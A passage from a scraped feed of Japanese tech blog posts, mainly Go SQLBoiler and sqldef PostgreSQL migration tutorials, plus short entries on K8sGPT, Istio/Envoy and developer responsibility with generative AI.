mainimport (    \\"context\\"    \\"database/sql\\"    \\"fmt\\"    \\"log\\"    _ \\"github.com/lib/pq\\"    \\"github.com/nwiizo/workspace_2024/sqlboiler/models\\" // 生成されたモデルのインポート    \\"github.com/volatiletech/null/v8\\"    \\"github.com/volatiletech/sqlboiler/v4/boil\\"    \\"github.com/volatiletech/sqlboiler/v4/queries/qm\\")func main() {    // データベース接続    db, err := sql.Open(        \\"postgres\\",        \\"postgres://postgres:postgres@localhost/postgres?sslmode=disable\\",    )    if err != nil {        log.Fatal(err)    }    defer db.Close()    ctx := context.Background()    // SELECT: 全ての書籍を取得    allBooks, err := models.Books().All(ctx, db)    if err != nil {        log.Fatal(err)    }    for _, book := range allBooks {        log.Printf(\\"Book: %+v\\\\n\\", book)    }    fmt.Println(\\"Select: 高度なクエリでの書籍の取得\\")    books, err := models.Books(        models.BookWhere.Title.EQ(\\"Specific Title\\"),        models.BookWhere.AuthorID.EQ(1),        qm.Limit(10),    ).All(ctx, db)    if err != nil {        log.Fatal(err)    }    for _, book := range books {        fmt.Println(\\"Book:\\", book.Title)    }    fmt.Println(\\"Count: 書籍の数を数える\\")    count, err := models.Books(models.BookWhere.Title.EQ(\\"Specific Title\\")).Count(ctx, db)    if err != nil {        log.Fatal(err)    }    fmt.Println(\\"Count:\\", count)    fmt.Println(\\"Exists: 特定の条件に一致する書籍が存在するかを確認\\")    exists, err := models.Books(models.BookWhere.Title.EQ(\\"Specific Title\\")).Exists(ctx, db)    if err != nil {        log.Fatal(err)    }    fmt.Println(\\"Exists:\\", exists)    fmt.Println(\\"Insert: 書籍の挿入\\")    newBook := &models.Book{        Title:         \\"New Book\\",        AuthorID:      1,        PublisherID:   1,        Isbn:          null.StringFrom(\\"1234567890\\"),        YearPublished: null.IntFrom(2023),    }    err = newBook.Insert(ctx, db, boil.Infer())    if err != nil {        log.Fatal(err)    }    fmt.Println(\\"Update: 書籍の更新\\")    newBook.Title = \\"Updated Title\\"    _, err = newBook.Update(ctx, db, boil.Infer())    if err != nil {        log.Fatal(err)    }    fmt.Println(\\"Upsert: 書籍のアップサート\\")    upsertBook := &models.Book{        BookID:        newBook.BookID,        Title:         \\"Upserted Title\\",        AuthorID:      2,        PublisherID:   2,        Isbn:          null.StringFrom(\\"0987654321\\"),        YearPublished: null.IntFrom(2024),    }    err = upsertBook.Upsert(ctx, db, true, []string{\\"book_id\\"}, boil.Infer(), boil.Infer())    if err != nil {        log.Fatal(err)    }    fmt.Println(\\"Delete: 書籍の削除\\")    _, err = newBook.Delete(ctx, db)    if err != nil {        log.Fatal(err)    }    fmt.Println(\\"Reload: 書籍の再読み込み\\")    err = newBook.Reload(ctx, db)    if err != nil {        if err == sql.ErrNoRows {            fmt.Println(\\"Reload: 書籍が見つかりませんでした\\")        } else {            log.Fatal(err)        }    }    // Eager Loading の例    // ユーザーと関連する書籍を取得    // user, err := models.FindUser(ctx, db, 1, qm.Load(\\"Books\\"))    // if err != nil {    //     log.Fatal(err)    // }    // for _, book := range user.R.Books {    //     fmt.Println(\\"Book:\\", book.Title)    // }    // デバッグ出力の例    // boil.DebugMode = true    // books, _ = models.Books().All(ctx, db)    // boil.DebugMode = false    // Raw Query の例    // _, err = queries.Raw(\\"SELECT * FROM books WHERE title = \'New Book\'\\").QueryAll(ctx, db)    // if err != nil {    //     log.Fatal(err)    // }    // Hook の例    // func myBookHook(ctx context.Context, exec boil.ContextExecutor, book *models.Book) error {    //     fmt.Println(\\"Book Hook Triggered\\")    //     return nil    // }    // models.AddBookHook(boil.BeforeInsertHook, myBookHook)    // null パッケージの使用例    // newBook.Isbn = null.StringFromPtr(nil) // ISBN を null に設定}このプログラムでは、まずデータベースに接続し、全ての書籍を取得する操作から始まります。その後、特定の条件に一致する書籍の数を数えたり、特定の条件に一致する書籍が存在するかを確認したりする操作を行います。その後、新しい書籍をデータベースに挿入し、その書籍の情報を更新します。次に、アップサート操作を行い、特定の書籍を削除し、最終的には削除された書籍の情報を再読み込みします。このプロセスは、SQLBoilerを使ってGo言語でデータベース操作を行う際の典型的なフローを示しています。また、コメントアウトしていたコードに関しても一部は解説させてください。高度なクエリ構築SQLBoilerでは、qmパッケージを利用して複雑なクエリを組み立てることができます。例えば、特定の条件を満たす書籍を取得するために、以下のようなクエリを構築することが可能です。books, err := models.Books(    models.BookWhere.Title.EQ(\\"Specific Title\\"),    models.BookWhere.AuthorID.EQ(1),    qm.Limit(10),).All(ctx, db)if err != nil {    log.Fatal(err)}for _, book := range books {    fmt.Println(\\"Book:\\", book.Title)}このコードは、タイトルが\\"Specific Title\\"であり、かつ著者IDが1の書籍を最大10件まで取得します。Eager LoadingSQLBoilerを使うと、関連するレコードを事前にロードするEager Loadingも可能です。たとえば、あるユーザーに関連するすべての書籍を取得するには、以下のようにします。user, err := models.FindUser(ctx, db, 1, qm.Load(\\"Books\\"))if err != nil {    log.Fatal(err)}for _, book := range user.R.Books {    fmt.Println(\\"Book:\\", book.Title)}この例では、IDが1のユーザーに関連するすべての書籍を取得しています。デバッグ出力SQLBoilerを使用する際、boil.DebugModeを有効にすることで、実行されたSQLクエリを確認することができます。これはデバッグ時に非常に便利です。boil.DebugMode = truebooks, _ := models.Books().All(ctx, db)boil.DebugMode = falseRaw Queryの使用SQLBoilerでは、生のSQLクエリを直接実行することも可能です。これは特定のシナリオで必要となる複雑なクエリを実行する際に役立ちます。_, err = queries.Raw(\\"SELECT * FROM books WHERE title = \'New Book\'\\").QueryAll(ctx, db)if err != nil {    log.Fatal(err)}このコードは、タイトルが\'New Book\'のすべての書籍を取得します。Hookの設定SQLBoilerでは、データベース操作の前後に実行されるHookを設定することができます。これはデータの整合性を保つための追加のロジックを実行する際に便利です。func myBookHook(ctx context.Context, exec boil.ContextExecutor, book *models.Book) error {    fmt.Println(\\"Book Hook Triggered\\")    return nil}models.AddBookHook(boil.BeforeInsertHook, myBookHook)この例では、書籍がデータベースに挿入される前に特定の処理を行うHookを設定しています。nullパッケージの活用SQLBoilerでは、nullパッケージを利用して、データベースのNULL値を扱うことができます。これにより、NULL許容のフィールドを安全に操作することが可能になります。newBook.Isbn = null.StringFromPtr(nil) // ISBNをNULLに設定newBook.YearPublished = null.IntFrom(2023) // 発行年を設定このコードでは、ISBNをNULLに設定し、発行年を2023に設定しています。まとめSQLBoilerは、Go言語でリレーショナルデータベースを効率的に操作するための強力なORM（Object-Relational Mapping）ライブラリです。データベーススキーマから直接Goのコードを生成し、開発者が細かなデータベース操作を手作業で行う負担を軽減します。SQLBoilerは、CRUD操作、リレーションシップの管理、フックの実装など、多様な機能を提供し、開発者がビジネスロジックに集中できる環境を整えます。この記事では、SQLBoilerの基本的な使用方法から、生成されたコードの実際の利用方法までを解説しました。まず、データベーススキーマの定義とSQLBoilerの環境設定を行い、サンプルデータの挿入を通じて実際のデータベース操作を準備しました。次に、SQLBoilerによって生成されたGoのモデルを利用して、Select、Insert、Update、Upsert、Delete、Reloadといった一連のデータベース操作を行うプロセスを紹介しました。これらの操作は、リレーショナルデータベースとGoプログラムの間のインタラクションを容易にし、開発プロセスを加速します。SQLBoilerは、Go言語でのデータベース操作を簡素化し、開発速度を向上させることが可能です。手動でのデータベース操作コードの記述が多い開発者にとって、SQLBoilerは大きな助けとなります。SQLBoilerの詳細や使い方については、SQLBoiler GitHubページを参照してください。［改訂3版］内部構造から学ぶPostgreSQL―設計・運用計画の鉄則 (Software Design plus)作者:上原 一樹,勝俣 智成,佐伯 昌樹,原田 登志技術評論社Amazon参考資料GitHub - d-tsuji/awesome-go-orms: ORMs for Go, most starred on GitHub.GitHub - avelino/awesome-go: A curated list of awesome Go frameworks, libraries and softwareGoのORMの人気ランキングを年ごとにまとめてみたGo言語 SQLBoilerでタイプセーフに複数条件のWhere句を書く #Go - QiitaGoのORM決定版 Genをはじめよう #Go - QiitaGoにおけるORMと、SQLBoiler入門マニュアル","link":"https://syu-m-5151.hatenablog.com/entry/2024/01/23/161638","isoDate":"2024-01-23T07:16:38.000Z","dateMiliSeconds":1705994198000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"K8sGPT: Prometheus Analyzers","contentSnippet":"v0.3.26 からPrometheus の Analyzer がリリースされましたデモ映像はこちらhttps://github.com/k8sgpt-ai/k8sgpt/pull/855本PR作成者の Daniel Clark さんは Google の方 (2024/01/18時点)で，prometheus-engine (Cloud Managed Service for Prometheus (GMP)) に多くのコントリビューションをされています． 先にまとめPrometheus Analyzer には現在二つの機能が含まれるConfig Analyzer ...","link":"https://zenn.dev/tozastation/articles/71015cc5b95b4e","isoDate":"2024-01-23T03:00:00.000Z","dateMiliSeconds":1705978800000,"authorName":"tozastation","authorId":"tozastation"},{"title":"openssl s_client で SMTP 認証","contentSnippet":"Amazon SES で SMTP を使ってメール送信したい場合、IAM User の credentials をちょいと加工してやる必要があります。 Amazon SES SMTP 認証情報を取得 これで、変換した値が正しいことを確認するために実際に","link":"https://blog.1q77.com/2024/01/smtp-auth-plain-with-openssl-command/","isoDate":"2024-01-23T02:44:23.000Z","dateMiliSeconds":1705977863000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PostgreSQLのsqldefによるDBスキーマ管理で遊んだ。 ","contentSnippet":"はじめにこの記事では、データベーススキーママイグレーションツールであるsqldefで遊んだので使用方法とその特徴について解説します。sqldefはRidgepoleに触発されて開発されたツールで、データベースのスキーマ変更を容易に行えるように設計されています。github.com1. sqldefとはsqldefは「The easiest idempotent MySQL/PostgreSQL/SQLite3/SQL Server schema management by SQL」と謳われるDBスキーマ変更管理ツールです。GitHub上で公開されており（sqldef GitHubリポジトリ）、MySQL、PostgreSQL、SQLite3、SQL Serverに対応しています。このツールを使用することで、CREATE TABLE文を書くだけで対象テーブルの比較とALTER TABLE文の生成・実行が可能になります。sqldefは、データベースの現在のスキーマとユーザーが提供するCREATE TABLE文を比較し、必要な変更を自動的に検出します。このプロセスにより、データベースの変更をより簡単かつ迅速に行うことができます。また、sqldefはidempotent（冪等性）を持つため、同じ変更を何度適用しても、結果として得られるスキーマは同じになります。これにより、データベースの変更管理がより安全かつ予測可能になります。このツールは特に、開発環境やテスト環境での迅速な変更適用や、本番環境への安全な変更のロールアウトに非常に有用です。2. sqldefの利点従来のスキーママイグレーションツールではCREATE TABLE文とALTER TABLE文を二重管理する必要がありましたが、sqldefを使用すると新規作成DDL文のみを管理するだけで済むため、DBA（データベース管理者）および開発者の作業負担が大幅に軽減されます。また、CI/CDパイプラインにも簡単に組み込むことができるため、デプロイメントプロセスの自動化と整合性の向上が期待できます。2.1 sqldefの最大の利点は、そのシンプルさと効率性従来のツールでは、データベースの初期状態を構築するためのCREATE TABLE文と、既存のデータベースを変更するためのALTER TABLE文の両方を管理する必要がありました。しかし、sqldefを使えば、CREATE TABLE文のみを管理すれば十分で、ALTER TABLE文は自動的に生成されます。これにより、変更の管理が簡略化され、DBAと開発者の双方の作業負担が大幅に減少します。2.2 CI/CDパイプラインへの組み込みさらに、sqldefはCI/CDパイプラインとの統合が容易で、これによりデプロイメントプロセスの自動化が可能になります。データベースの変更をコードレビューとテストのプロセスに組み込むことで、変更の品質を向上させ、本番環境への変更のロールアウトをより安全に行うことができます。このように、sqldefは開発チームの生産性を高め、データベースの整合性を維持するための強力なツールです。3. やってみる実際にsqldefを使用するためには、適切な環境構築が不可欠です。このセクションでは、Dockerを活用してPostgreSQLサーバーをセットアップし、sqldefをダウンロードして設定する手順を具体的に説明します。その後、具体的なスキーマ定義を作成し、それをデータベースに適用してみます。3.1 環境構築Dockerを使用して、PostgreSQLのバージョン16を動作させる環境を構築します。以下のdocker-compose.yamlファイルを使用してPostgreSQLサーバーを立ち上げます。version: \'3\'services:  postgres:    container_name: postgres    image: postgres:16    restart: always    ports:      - \\"5432:5432\\"    environment:      POSTGRES_USER: \\"postgres\\"      POSTGRES_PASSWORD: \\"postgres\\"3.2 sqldefのダウンロードと設定sqldefの実行可能バイナリをGitHubからダウンロードし、設定します。これにより、任意のプラットフォームでsqldefを利用することが可能になります。curl -LO https://github.com/sqldef/sqldef/releases/download/v0.16.15/psqldef_darwin_amd64.zipunzip psqldef_darwin_amd64.ziprm psqldef_darwin_amd64.zip./psqldef --versionリリース情報はこちらから適切なアーキテクチャを選んでください。tarコマンドのオプションは覚えられず忘れているのでzipファイルを選びました。github.com3.3 スキーマの適用v01_library.sqlファイルを用意し、図書館システムの基本的なテーブルを作成します。このスクリプトでは、PostgreSQLのserial型を使用して主キーの自動インクリメントを行い、外部キー制約を設定しています。これにより、データベースの整合性が保たれ、アプリケーションの安定性が向上します。ただし、sqldefを用いたスキーマの適用は効率的ですが、特に外部キー制約に関連する場合には注意が必要です。外部キー制約はデータベースの整合性を保つために重要な役割を果たしますが、これらの制約を含むテーブルの変更を管理する際には、特定の課題が生じることがあります。今回のケースでは、これらの課題を避けるための工夫を取り入れながら、スキーマを適用していきます。-- 著者テーブルcreate table authors (  author_id serial primary key,  name varchar(100) not null);-- 出版社テーブルcreate table publishers (  publisher_id serial primary key,  name varchar(100) not null);-- 利用者テーブルcreate table users (  user_id serial primary key,  user_name varchar(100) not null,  email_address varchar(100),  registration_date date not null);-- 書籍テーブルcreate table books (  book_id serial primary key,  title varchar(255) not null,  author_id integer not null,  publisher_id integer not null,  isbn varchar(20),  year_published integer);-- 貸出記録テーブルcreate table loans (  loan_id serial primary key,  book_id integer not null,  user_id integer not null,  loan_date date not null,  return_date date);-- 外部キー制約の追加alter table books add constraint fk_books_author_id foreign key (author_id) references authors(author_id);alter table books add constraint fk_books_publisher_id foreign key (publisher_id) references publishers(publisher_id);alter table loans add constraint fk_loans_book_id foreign key (book_id) references books(book_id);alter table loans add constraint fk_loans_user_id foreign key (user_id) references users(user_id);これを psqldef で以下のように適用します。PGPASSWORD=postgres ./psqldef -h localhost -p 5432 -U postgres postgres < v01_library.sql3.4 スキーマの変更ユーザーテーブル（users）の構造を変更するための新しいDDLスクリプトを作成し、sqldefを使用して適用します。この変更には、列の追加、列の型変更、NOT NULL制約の追加が含まれ、データベースの設計を現代的な要件に合わせることができます。-- v02_library.sqlcreate table users (  user_id serial primary key,  family_name varchar(100) not null,  given_name varchar(100) not null,  email_address varchar(254) not null,  registration_date date not null);これを psqldef で以下のように適用します。PGPASSWORD=postgres ./psqldef -h localhost -p 5432 -U postgres postgres < v02_library.sql-- Apply --ALTER TABLE \\"public\\".\\"users\\" ADD COLUMN \\"family_name\\" varchar(100) NOT NULL;ALTER TABLE \\"public\\".\\"users\\" ADD COLUMN \\"given_name\\" varchar(100) NOT NULL;ALTER TABLE \\"public\\".\\"users\\" ALTER COLUMN \\"email_address\\" TYPE varchar(254);ALTER TABLE \\"public\\".\\"users\\" ALTER COLUMN \\"email_address\\" SET NOT NULL;-- Skipped: DROP TABLE \\"public\\".\\"authors\\";-- Skipped: DROP TABLE \\"public\\".\\"books\\";-- Skipped: DROP TABLE \\"public\\".\\"loans\\";-- Skipped: DROP TABLE \\"public\\".\\"publishers\\";ALTER TABLE \\"public\\".\\"users\\" DROP COLUMN \\"user_name\\";3.5 ユニークキー制約の追加最後に、ユーザーテーブルにユニークキー制約を追加するためのDDLスクリプトを適用します。ユニークキー制約を追加することで、メールアドレスの重複を防ぎ、データの一意性を保証することができます。-- v03_library.sql-- ユーザーテーブルの作成create table users (  user_id serial primary key,  family_name varchar(100) not null,  given_name varchar(100) not null,  email_address varchar(254) not null,  registration_date date not null);-- メールアドレスに対するユニークキー制約（ユニークインデックス）create unique index idx_users_email_address on users(email_address);これを psqldef で以下のように適用します。PGPASSWORD=postgres ./psqldef -h localhost -p 5432 -U postgres postgres < v03_library.sql-- Apply ---- メールアドレスに対するユニークキー制約（ユニークインデックス）create unique index idx_users_email_address on users(email_address);-- Skipped: DROP TABLE \\"public\\".\\"authors\\";-- Skipped: DROP TABLE \\"public\\".\\"books\\";-- Skipped: DROP TABLE \\"public\\".\\"loans\\";-- Skipped: DROP TABLE \\"public\\".\\"publishers\\";4. 結論sqldefは、データベーススキーマの変更を簡単かつ効率的に行うことができる強力なツールです。特に、継続的インテグレーション/継続的デリバリー（CI/CD）パイプラインの一部としてスキーマ変更の自動化を行う際に非常に有効であり、開発プロセスの加速とデータベース整合性の向上に大きく寄与します。ただし、すべてのケースに適用可能なわけではなく、その特性と限界点を十分理解することが重要です。今回は実験的に使用してみた結果、このようなツールの有用性を実感しました。また、実際に運用経験のある方々の貴重なフィードバックが参考文献に掲載されていますので、より深い洞察を得るためにも、ぜひ参考にしていただくと良いでしょう。プログラマのためのSQL 第4版 すべてを知り尽くしたいあなたに作者:Joe Celko翔泳社Amazon5.参考文献sqldefDocker Compose overviewpostgres | Docker Official ImageGo製マイグレーションツールまとめsqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントDBスキーマ変更管理ツール sqldef を試してみたsqldefへのSQL Server対応のコントリビュート 〜OSS活動を通して紐解くDBマイグレーションツールの実装〜ミラティブのサーバサイドをGo + Clean Architectureに再設計した話マイグレーションツールをsqldefに移行した話","link":"https://syu-m-5151.hatenablog.com/entry/2024/01/22/124414","isoDate":"2024-01-22T03:44:14.000Z","dateMiliSeconds":1705895054000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"dockerで行う12ステップで作る組込みOS自作入門","contentSnippet":"はじめに冬休みに12ステップで作る 組込みOS自作入門を完走したをkozosを完走しました。そのときの備忘録になります。12STEPの各内容は以下のようになっています。第1部 ブート・ローダーの作成1stステップ 開発環境の作成2ndステップ シリアル通信3rdステップ 静的変数の読み書き4thステップ シリアル経由でファイルを転送する5thステップ ELFフォーマットの展開6thステップ もう一度，Hello World第2部 OSの作成7thステップ 割込み処理を実装する8thステップ スレッドを実装する9thステップ 優先度スケジューリング...","link":"https://zenn.dev/satoken/articles/kozos-step-by-step","isoDate":"2024-01-21T13:10:45.000Z","dateMiliSeconds":1705842645000,"authorName":"satoken","authorId":"satoken"},{"title":"アヒルに話かけると仕事をしてくれるが責任まではとってくれない","contentSnippet":"正直に言えば、責任も取ってほしい。k0kubunさんのAIにプログラミング作業を奪われているに対する感想です。はじめに現代のソフトウェア開発は、生成AIの急速な進化によって前例のない大規模な変革を経験しています。かつては時間と労力を要していた複雑な作業が、生成AIの導入により効率的かつ迅速に行えるようになりました。特に、DevOpsやSREの分野での生成AIの利用は注目に値します。自動化されたプロセスにより、開発サイクルが加速し、ソフトウェアの品質と信頼性が向上しました。その結果、継続的インテグレーションやデリバリーのプロセスが効率化され、開発チームは新しい機能の実装やバグ修正に迅速に対応できるようになりました。この技術革新は、ユーザーだけでなく、開発者自身の作業プロセスにも大きな変化をもたらしており、良い影響を与えることが期待されます。本稿では、自動コード生成の利点と課題、開発者の責任、そして最終的には人間中心の設計と開発の重要性について探求します。自動コード生成と開発者への影響自動コード生成の分野では、生成AIは開発者の作業を劇的に簡素化し、プログラミングの高速化と精度向上を実現しています。この技術の進歩により、開発者はルーチン作業から解放され、より複雑で創造的な問題に集中できるようになりました。生成AIによる自動コード生成は、開発者が新しいアイデアやソリューションを迅速に試すことを可能にし、従来の開発手法とは異なる新しいアプローチを提供しています。ただし、このような革新的な進歩には新たなリスクも伴い、セキュリティやプライバシー、倫理的な課題に対応する必要があります。開発者はこれらの新たな課題に適切に対処するために、生成AIの活用を慎重に管理し、適切に調整する必要があります。アヒルに話かけると仕事は終わる「ラバーダック・デバッグ」というテクニックは、問題をゴム製のアヒルに説明することで解決策を見つける効果的な方法です。同様に、生成AIと対話することは、仕事を効率的に終えるためのアプローチとなります。ソフトウェア開発において、生成AIは開発者の負担を大幅に軽減し、ルーチン作業から複雑なタスク処理までをサポートします。この進化により、開発者は日常の作業から一歩離れ、より戦略的で創造的な活動に集中できるようになります。その結果、プロジェクトの進捗が加速し、開発サイクルが短縮されることが可能になります。Happy Trees アヒル お風呂用おもちゃ 大型 バスダック スクイークゴム アヒル ベビーシャワー 7インチHappy Trees MauLaikaAmazon生成AIを活用した創造的な問題解決の促進自動コード生成を含む生成AIの技術は、開発者を日常の作業から解放し、より複雑で創造的な問題解決に集中させます。生成AIによるバグ検出やパフォーマンス最適化機能は、ソフトウェアの信頼性と効率性を飛躍的に向上させています。これらの技術の進歩は、開発プロセスの速度向上だけでなく、ソフトウェアの全体的な品質向上と持続的な改善ももたらしています。生成AIは、開発者が直面する課題に新たな解決策を提供し、イノベーションの可能性を広げています。働きたくないイタチと言葉がわかるロボット 人工知能から考える「人と言葉」作者:川添愛朝日出版社Amazonアヒルは仕事をしてくれるが責任はとれない生成AIはソフトウェア開発に多くの利点を提供しますが、その適用範囲と機能には限界があります。生成AIはプロジェクトの特定の側面を助ける強力なツールとして機能しますが、最終的な製品の品質、セキュリティ、倫理的な問題解決は開発者の裁量と判断に委ねられています。例えば、生成AIは基本的なコード生成や一般的な問題の検出に優れた能力を発揮しますが、複難なシステムアーキテクチャの設計や新しい種類のセキュリティリスクに対処するためには、開発者の深い技術知識と経験が必要です。開発者の役割と責任したがって、開発者は生成AIの提案を批判的に評価し、プロジェクトのニーズに応じて適切な調整や改善を行う責任があります。生成AIは開発プロセスを支援し、効率化を促進できますが、最終的な製品の品質と機能性の確保は開発者の責任です。開発者は、生成AIによって提供されるソリューションの品質を確保し、プロジェクトの目標達成に向けて責任を持つことが求められます。また、生成AIの活用に伴う潜在的なリスクを理解し、適切に管理することも重要です。このようにして、生成AIと人間の開発者は協力しながら、高品質で安全なソフトウェアを創造できます。人間中心の設計と開発生成AIの技術進歩は、ソフトウェア開発のプロセスを変革していますが、この変革の中心には常にユーザー（社内外問わず）が存在します。人間中心の設計と開発は、技術が人間のニーズ、価値、行動に基づいて開発されるべきだという理念に根ざしています。このアプローチは、生成AIを含む技術が、ユーザーや開発者のエクスペリエンスを向上させ、よりアクセスしやすく、開発しやすく、使いやすい製品を生み出すことを目指しています。人間中心の設計では、開発初期段階からユーザーフィードバックを組み込み、継続的なテストと改善を通じて、ユーザーの実際の使用状況を反映したソリューションを提供します。開発者は、ユーザーの視点を理解し、その視点を設計と開発のプロセスに統合することで、より人間中心のアプローチを取り入れることができます。これには、多様なユーザーグループとの協力、ユーザビリティテストの実施、アクセシビリティガイドラインの遵守が含まれます。このようにして、開発者は生成AIの潜在的な利点を最大限に活用しながら、技術が人間のニーズに適応することを保証できます。同じ開発者に対しても良い行動を示すことが重要であり、互いに刺激し合い、共に成長することで、全体の業界の水準を引き上げることに寄与します。人間の仕事として最後に残るものソフトウェア開発において生成AIの役割が拡大している現在、人間中心の設計と開発の原則は、開発者が直面する責任と課題に新たな次元を加えています。技術の進歩は、単に作業の自動化や効率化を超え、開発者に対して、ユーザーの深い理解と共感を基にした意思決定を行うことを要求しています。このコンテキストでは、倫理的な判断、戦略的思考、そして人間の感情と経験を理解する能力が、人間の仕事として最後に残る核心的な要素となります。開発者は、生成AIを活用することで得られる多大な利益を享受しつつも、最終的な製品がユーザーの実生活において意味のある価値を提供することを確実にする責任を負います。このためには、技術の知識と同様に、人間と社会に関する深い洞察が必要です。生成AIの進歩によって開発者の役割が変化しても、最終的な目標は変わりません。それは、人間の生活を豊かにし、より良い未来を形成することです。したがって、人間中心の設計と開発の精神は、ソフトウェア開発における人間の仕事の未来を形作る基盤となります。このようにして、生成AIと人間の開発者は、高品質で、使いやすく、全ての人にとって有益なソフトウェアを共に創出していくことができます。プロフェッショナリズムの重要性プロフェッショナリズムは、技術の進歩と人間中心の設計の精神を融合させる上で不可欠な要素です。生成AIのような強力なツールを活用する際、開発者は単に技術的なスキルを超えた行動規範を持つ必要があります。プロフェッショナルとして、不十分な対応や適切ではない言い訳に直面した際には、我々はしばしば失望と不満を感じます。このため、開発者は常に高い倫理基準を維持し、ユーザーのニーズと安全を最優先する責任があります。問題に直面した場合、待つのではなく、積極的に解決策を探し、適切な対応を行うことが求められます。このプロフェッショナリズムは、生成AIの倫理的使用、人間中心の設計原則、そして最終的にはソフトウェアの品質とユーザー体験の向上に寄与します。開発者としてのプロ意識を維持することは、技術の可能性を最大限に引き出し、同時に潜在的なリスクを適切に管理する上で不可欠です。また、プロフェッショナリズムは、開発者が生成AIを含むあらゆるツールを使って良質なソフトウェアを生み出すための基盤を形成します。さらに、プロフェッショナリズムは、チーム内外での信頼と尊敬を築く上でも重要です。開発者が高いプロ意識を示すことで、チームメンバー間の協力が促され、プロジェクトの成功に向けた効果的なコミュニケーションと協働が可能になります。また、組織外の利害関係者やエンドユーザーに対しても、開発者の行動は組織の信頼性と評判を高めることに直接影響します。最終的に、プロフェッショナリズムの重要性は、技術的なスキルだけでなく、倫理的、人間的な価値を尊重し、それらを実務に統合することで、より良いソフトウェア製品とサービスを提供することにあります。生成AIの時代においても、開発者のプロ意識は、革新的で持続可能なソリューションの創出と、社会全体の利益に対する貢献の核心をなすものです。www.nhk.jp","link":"https://syu-m-5151.hatenablog.com/entry/2024/01/19/202246","isoDate":"2024-01-19T11:22:46.000Z","dateMiliSeconds":1705663366000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"PR-Agentとその類似システムの解説","contentSnippet":"はじめに Sreake事業部でインターンをしている村山です。そのようなコードレビューの作業に対し、今日ではLLMを使用したレビュー用のツールが開発されています。今回はそのレビューツールの一つであるPR-Agentを中心に […]The post PR-Agentとその類似システムの解説 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pr-agent-and-similar-systems/","isoDate":"2024-01-18T09:38:27.000Z","dateMiliSeconds":1705570707000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【Istio⛵️】Istioによって抽象化されるEnvoyのHTTPSリクエスト処理の仕組み","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのサイドカーメッシュを題材にしたEnvoyの設定の抽象化について様々なサービスメッシュツール (特に、Istio、Consul、Cilium、など) でも流用できるEnvoyの知識についてこの記事から得られる知識01. はじめに02. 様々なリソースによるEnvoy設定の抽象化サービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS03. istio-proxyコンテナによるHTTPS処理Istioコントロールプレーンの仕組みサービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS04. EnvoyによるHTTPS処理Envoyの設定の種類フィルターフィルターの一覧フィルターチェーンの仕組み05. リソースの設定からEnvoy設定への翻訳各リソースとEnvoyの設定の関係一覧サービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるマイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるサービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめる06. 翻訳されたEnvoy設定値を見てみるEnvoyの現在の設定を出力するリスナーを出力するルートを出力するクラスターを出力するエンドポイントを出力する証明書を出力するサービスメッシュ外からのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナマイクロサービス間のHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナサービスメッシュ外へのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナ07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、俺 (REMIX) feat. Istioニキ a.k.a いすてぃ男です。Istioは、Envoyを使用したサービスメッシュを実装します。IstioがKubernetesリソースやIstioカスタムリソースに基づいてEnvoyの設定を抽象化してくれるため、開発者はEnvoyをより簡単に設定できます。Envoyの設定の抽象化は、Envoyを使用したサービスメッシュ (例：Istioサイドカーメッシュ/アンビエントメッシュ、Consul、Istioから得られた学びを土台に登場したCiliumサイドカーフリーメッシュ、など) に共通しています。つまり、次々に登場するEnvoyによるサービスメッシュツールに振り回されないようにするためには、ツールがどのようにEnvoyを抽象化するのかを理解しておく必要があります。そこで今回は、IstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのかを解説します。また、抽象化されたEnvoyがHTTPSリクエストを処理する仕組みも一緒に解説します。これらの知識は、様々なサービスメッシュツールで流用できるはずです。それでは、もりもり布教していきます\uD83D\uDE1702. 様々なリソースによるEnvoy設定の抽象化まずは、どのようなリソースがHTTPSリクエストの処理に関係しているのかを、HTTPSリクエストの方向に分けて解説していきます。istio-proxyコンテナやEnvoyについては、次章以降で解説します。サービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| Gateway    Gateway([⛵️ Gateway]) -.-> VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。Istio IngressGateway Podは、宛先Podとの間で相互TLS認証を実施します。Istio IngressGateway Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud 